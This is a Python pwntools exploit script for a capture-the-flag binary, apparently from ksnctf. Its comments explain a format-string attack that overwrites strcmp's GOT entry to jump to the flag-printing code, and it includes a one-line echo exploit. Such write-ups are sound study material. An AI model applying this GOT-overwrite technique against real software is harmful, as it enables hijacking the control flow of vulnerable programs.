#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./q4"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+60
		b *main+297
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# checksec command
# $ checksec --file=./q4
# [*] '/home/t3mp/ctf/ksnctf/villager_A/q4'
#     Arch:     i386-32-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x8048000)
#
# No RELRO or Partial RELRO -> We can use GOT overwrite
# https://miso-24.hatenablog.com/entry/2019/10/16/021321
# https://tkmr.hatenablog.com/entry/2017/02/28/030528
#
# No PIE -> Executable file addresses are not randomized
# So exec file addresses can be used directly
# e.g.
# $ readelf -s ./q4 | grep main
# 70: 080485b4   298 FUNC    GLOBAL DEFAULT   13 main
# -> main func address is 0x080485b4
# https://miso-24.hatenablog.com/entry/2019/10/16/021321

# GOT overwrite
# strcmp@got: 0x080499fc
# Goal is     0x08048691 (before fopen)
# overwrite last 2byte (0x84ea -> 0x8691)

# Exploitation
# 1. overwrite strcmp@got -> 0x08048691(before fopen) with FSB
# 2. Do you want the flag? -> input something
# 3. call strcmp -> show flag
# 4. win !

## get address of strcmp@got
strcmp_got_addr = elf.got['strcmp']# ->  0x80499fc
overwrite_hex = 0x8691
## input strcmp@got address in the stack
## FSB index = %6$
## e.g. %6$p -> 0x080499fc
payload =  p32(strcmp_got_addr)# -> 4byte
## GOT overwrite
## %c -> print n bytes char
## %hn -> write 2bytes somewhere
## Why (overwrite_hex - 4) ?
## -> p32(strcmp_got_addr) is 4bytes
payload += "%{0}c%6$hn".format(overwrite_hex - 4).encode()

## So oneline exploit is
## $ echo -e "\xfc\x99\x04\x08%34445%6\$hn" | ./q4

p.recvuntil("?")
p.sendline(payload)

payload = b"0w0"

p.recvuntil("?")
p.sendline(payload)

p.interactive()
